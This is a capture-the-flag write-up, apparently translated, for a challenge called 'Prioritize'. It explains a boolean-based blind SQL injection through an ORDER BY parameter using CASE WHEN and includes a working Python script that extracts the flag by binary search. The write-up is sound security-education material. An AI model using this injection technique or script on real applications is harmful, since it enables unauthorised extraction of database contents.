Here's the English translation, formatted cleanly:

---

# Prioritize
Exploit chain: boolean-based blind SQLi on ORDER BY

## Recon
- Initial information from the server makes it easy to guess that we'll need to exploit a SQL injection vulnerability.
- The web server lets you add a new item and sort by a field in the database table, passed by the user via the `order` parameter. The fields include: `id` (testable by passing it directly in the URL), `date`, `done`, `title`.
- From this, we can easily infer the backend handles something like: `SELECT .... FROM ..... ORDER BY <value of order param> ASC;`

## Exploit
- Since the server has no feature that returns query results directly → this is a **blind SQL injection**.
- The server returns items sorted differently depending on the field → we can use the sort order in the response to distinguish true/false conditions → **boolean-based blind SQLi via ORDER BY**.
- Here we try using [CASE WHEN](https://www.sqlitetutorial.net/sqlite-case/) to test:

  <img width="1609" height="389" alt="image" src="https://github.com/user-attachments/assets/a65e65f5-a4e2-401f-a93e-06448254b8e2" />

  ---

  <img width="1607" height="369" alt="image" src="https://github.com/user-attachments/assets/750b5f5a-a635-4a18-b785-ecbed9b333e5" />

- We've now confirmed that `CASE WHEN` works for this challenge. Next, we need to brute-force the flag. However, since this is blind SQLi and we don't have much information about the database schema, I had to guess the table/column names holding the flag based on experience from previous CTF challenges.

  <img width="1607" height="365" alt="image" src="https://github.com/user-attachments/assets/0eb0ad2f-17d5-4043-9b86-2f47c56c34d2" />

- Luckily, the challenge didn't make it hard — the table and column names holding the flag were fairly easy to guess.

**Brute-forcing the flag:**

```python
import requests
true = requests.get(url="http://<IP_INSTANCE/?order=id")
flag = ""
def binary_search_attack(index, low, high):
    mid = (low + high) // 2
    test_case = chr(mid)
    if test_case == "#" or test_case == "'" or test_case == '"':
        return None
    check = requests.get(url=f"http://<IP_INSTANCE/?order=CASE WHEN substr((SELECT flag from flag),{index},1) = '{test_case}' THEN id ELSE date END")
    if check.text == true.text:
        return chr(mid)
    check = requests.get(url=f"http://<IP_INSTANCE/?order=CASE WHEN substr((SELECT flag from flag),{index},1) > '{test_case}' THEN id ELSE date END")
    if check.text == true.text:
        return binary_search_attack(index, mid + 1, high)
    else:
        return binary_search_attack(index, low, mid - 1)

while flag.endswith("}") == False:
    index = len(flag) + 1
    test = binary_search_attack(index, 32, 126)
    if test != None:
        flag += test
    print(flag)
```

---
